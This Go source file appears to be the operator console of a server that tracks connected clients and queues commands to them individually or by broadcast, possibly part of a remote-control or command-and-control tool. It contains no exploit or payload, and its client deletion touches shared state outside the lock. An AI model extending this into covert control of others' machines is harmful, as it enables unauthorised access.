package main

import (
	"fmt"
	"strings"
	"bufio"
	"os"
)

func displayConnections() {

	clientsMu.Lock()
	defer clientsMu.Unlock()

	fmt.Println("Active clients:")
	for id, client := range clients {
		fmt.Printf("- ID: %s | Address: %s | Reachable: %v\n", id, client.Conn.RemoteAddr(), client.Reachable)
	}
}



func broadcastMessage(msg string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()


	for id, client := range clients {
		err := commandStore.AddCommand(client.ID, msg)
		if err != nil {
			logInfo.Printf("Error when storing \"%s\" to %s client (%s): %v\n", msg, id, client.Conn.RemoteAddr(), err)
		} else {
			logInfo.Printf("[+] Stored message \"%s\" to %s client (%s)\n", msg, id, client.Conn.RemoteAddr())
		}
	}
}


func showOptions() {
	for {
		fmt.Println("\nServer options : ")
		fmt.Println("[+] 1 - Display active connections")
		fmt.Println("[+] 2 - Broadcast a message")
		fmt.Println("[+] 3 - Send a message to a specific client")
		fmt.Println("[+] 4 - Delete a client")
		fmt.Println("[+] 5 - Quit server")
		fmt.Print("> ")

		var choice int
		fmt.Scanln(&choice)

		switch choice {
		case 1:
			displayConnections()
		case 2:
			fmt.Print("Message to send : ")
			reader := bufio.NewReader(os.Stdin)
			msg, _ := reader.ReadString('\n')
			msg = strings.TrimSpace(msg)
			broadcastMessage(msg)
		case 3:
			displayConnections()
			fmt.Print("Enter client ID: ")
			reader := bufio.NewReader(os.Stdin)
			id, _ := reader.ReadString('\n')
			id = strings.TrimSpace(id)

			clientsMu.Lock()
			client, exists := clients[id]
			clientsMu.Unlock()

			if !exists {
				fmt.Println("[!] Client not found")
				break
			}

			fmt.Print("Enter message: ")
			msg, _ := reader.ReadString('\n')
			msg = strings.TrimSpace(msg)

			err := commandStore.AddCommand(id, msg)
			if err != nil {
				logInfo.Printf("[!] Failed to store message to %s: %v", id, err)
			} else {
				logInfo.Printf("[+] Stored message \"%s\" to %s (%s)", msg, id, client.Conn.RemoteAddr())
			}
		case 4:
			displayConnections()
			fmt.Print("Enter client ID to delete: ")
			reader := bufio.NewReader(os.Stdin)
			id, _ := reader.ReadString('\n')
			id = strings.TrimSpace(id)

			clientsMu.Lock()
			_, exists := clients[id]
			clientsMu.Unlock()

			if !exists {
				fmt.Println("[!] Client not found")
				break
			}


			clients[id].Conn.Close()
			logInfo.Printf("[-] Client %s (%s) deleted", id, clients[id].Conn.RemoteAddr())
			
			clientsMu.Lock()
			delete(clients, id)
			clientsMu.Unlock()

			commandStore.Lock()
			delete(commandStore.Commands, id)
			_ = commandStore.Save()
			commandStore.Unlock()

		case 5:
			fmt.Println("Shutting down server...")
			os.Exit(0)
		default:
			fmt.Println("[!] Invalid choice, please try again.")
		}
	}
}